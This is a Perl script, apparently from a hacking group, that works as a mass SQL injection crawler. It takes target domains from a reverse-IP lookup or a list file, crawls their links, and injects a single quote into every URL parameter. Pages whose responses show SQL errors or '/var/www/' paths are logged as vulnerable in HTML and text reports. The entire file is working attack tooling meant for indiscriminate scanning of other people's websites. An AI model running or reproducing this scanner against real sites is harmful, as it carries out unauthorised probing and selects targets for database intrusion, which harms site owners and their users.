#!/usr/bin/perl -w
##########################################################################################
# IndiaN CYBeR F0rCE (ICF) Ma55 SQLI CRAWLER TOOL!                                                             #
# Coded by B47CHGURU (ICF MOD ) on 7-07-2011                                                        #
# Updated on 12-08-2011                                                                  #
#if any bugs are found ...plz do inform me at interestingpal@gmail.com                   #
#reverse ip tool incorporated wont extract all websites.. use yougetsignal.com           #
#Note: You should first install HTML::LinkExtor module with CPAN shell                   #
#----------------------------------------------------------------------------------------#
#To all script kiddies..... changing the "made by" headers wont make you the coder...!!  #
#Respect the coderz..!!!                                                                 #
##########################################################################################




########################CHANGE AREAS##########################
$show = 0;####shows the extracted links

#############################################################



if($^O =~ /Win/){

   system("cls");

}else{

   system("clear");
}
 print ("\n#######################################################\n");

 print ("    Welcome to INDIAN CYBER FORCE Mass sqli Crawler! BY B47CHGURU\n");
 
 print ("########################################################\n\n\n");
 use LWP::UserAgent;
 use HTML::LinkExtor;
 use URI::URL;
 use HTTP::Request;
my  $i = 1;
my 	$sql	= "'"; 
my 	$locate = "";
my 	@uri;
my  $count = 0;
my  $vul = 0;
my  $incount = 0;
my 	$ua = LWP::UserAgent->new;
$ua->timeout (20);
$data='scanned.html';
$indicator = 'b';
 open (CHECKR, "<$data");

@CHECKED = <CHECKR>;
close CHECKR;
foreach $Post(@CHECKED) {
if ($Post=~/SQLI/){
$indicator = 'a';
} else {
}
}

open HTML, ">>", "scanned.html" or die $!;
if ($indicator=~/b/){
print HTML "<html xmlns=\"http://www.w3.org/1999/xhtml\"> \n <head> \n <title>I-C-F Mass SQLI Crawler..!!</title> \n  </head>";
print HTML "<body id=\"#body\" body bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#FF3333\" vlink=\"#C0C0C0\" alink=\"#990000\" marginwidth=\"100\" align=\"left\"> \n";
print HTML "<br /> \n <center>\n <h1>I-C-F Mass SQLI Crawler v.1.0..!!</h1> \n <h2>####Scan results####    Greetz : 0p7!k f!ber,C0de inj3ctor, Coded32,LionAneesh,LuCky,DevilG4rg,jethro inwald & all indian hackers ....jaiHind.....</h2> \n ";
} else {
print HTML "<html xmlns=\"http://www.w3.org/1999/xhtml\"> \n <head> \n <title>I-C-F Mass SQLI Crawler..!!</title> \n  </head>";
print HTML "<body id=\"#body\" body bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#FF3333\" vlink=\"#C0C0C0\" alink=\"#990000\" marginwidth=\"100\" align=\"left\"> \n";
print HTML "<br /> \n <center>\n ";
}
my @imgs = ();
  sub reverse {
     my($tag, %attr) = @_;
     return if $tag ne 'a';
     push(@TARGETS, values %attr);
  }
print " Do you want to do reverseip or load website list from file ..?(y/n)>";
my $revlist=<STDIN>;
if($revlist =~ /y/){
print "\n IP/Website you want to reverse..\? >";
my $website=<STDIN>;
chomp($website);
my $linds = 'http://sameip.org/ip/' . $website;
print (" \n ############################################## \n");
$url = $linds;
  $p = HTML::LinkExtor->new(\&reverse);

  
  $res = $ua->request(HTTP::Request->new(GET => $url),
                      sub {$p->parse($_[0])});

 
  my $base = $res->base;
  @TARGETS = map { $_ = url($_, $base)->abs; } @TARGETS;
  sort(@TARGETS);
  splice (@TARGETS, 0, 1);
  print join("\n", @TARGETS), "\n";
  print (" \n ############################################## \n\n");
  $linkno=$#TARGETS + 1;
goto loop2;
} else {
}

  sub callback {
     my($tag, %attr) = @_;
     return if $tag ne 'a';
     push(@imgs, values %attr);
  }

  
  print " Path to your website scan list. >";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$linkno=$#TARGETS + 1;
loop2:  foreach $linds(@TARGETS){

@imgs = ();
print ("\n");
print ("\n");
print join("\n", @imgs), "\n";
$incount = 0;
  chomp($linds);
    if ($linds =~ /sameip.org/ | $linds =~ /nameserverspy.org/ | $linds =~ /dailydomainspy.com/ | $linds =~ /dailydomains.org/){
next loop2;
}
$thelind = $linds;
$thelind = clear($thelind);
$thelind = trim($thelind);
$url = $thelind;
  $p = HTML::LinkExtor->new(\&callback);

  
  $res = $ua->request(HTTP::Request->new(GET => $url),
                      sub {$p->parse($_[0])});

  
  my $base = $res->base;
  @imgs = map { $_ = url($_, $base)->abs; } @imgs;
sort(@imgs);
$linkdo=$#imgs + 1;
if ($show =~ /1/){
print join("\n", @imgs), "\n";
}
print("\n ------------------------------------------------------------- \n   Scanning for vulnerabilities in $url \n ------------------------------------------------------------- \n");

sqli();
@imgs = ();
print ("\n");
print ("\n");
print join("\n", @imgs), "\n";
$incount = 0
}
# Scanning 
sub sqli{
loop: foreach $path(@imgs){
chomp($path);
$webcl=$path;

$webcl = trim($webcl);
$url = $webcl;
if($url=~/facebook/ | $url=~/mailto/){
next loop;
	}
 if($url=~/=/){

	} else {
	next loop;
	}
	$incount=$incount+1;

if($incount=~/36/){
next loop2; 
}
if ($url =~ m/=/sim) {
 $url =~ s/=/='/g;
 
} else {

}
print "\n $url";
   
	my 	$req = HTTP::Request->new( GET => $url );
	my 	$response = $ua->request( $req );
	if( $response->content =~ /SQL/ || $response->content =~ /\/var\/www\//) {
		open OUTFILE, ">>", "scanned.txt" or die $!;
		print OUTFILE "$url \n";
		if(($count+1)%2) {
			print HTML "\t\t\n<tr><td><a href=\"$url\"><font color=\"#66FF66\"><strong>$url</strong></font></a> \n </br> \n </br> \n";
		} else {
			print HTML "\t\t\n<tr><td><a href=\"$url\"><font color=\"#66FF66\"><strong>$url</strong></font></a> \n </br> \n </br> \n";
		}
		$count++;
		print "\n [+]", $url, "(",$count,"/",$incount,")";
		
		close OUTFILE;
		
	} else {
		
	}
}


print "\n\n $count vulnerable links found in $linds. Extracted link count: $linkdo \n";

}
sub clear{

   $website = shift;

   if($website !~ /^http/){

      $website = 'http://www.' . $website;

   }

   

   return $website;

}

sub trim{
  $string = shift;
  $string =~ s/^\s+//;            
  $string =~ s/\s+$//; 
  return $string;         
}
print ("\n\n Successfully scanned $linkno websites. View results in: 'scanned.html'.\n");
print HTML "\n </center>\n </body> \n </html>";
close HTML;

if($^O =~ /Win/){

   system('.\scanned.html');
 
}else{

   system('./scanned.html');

}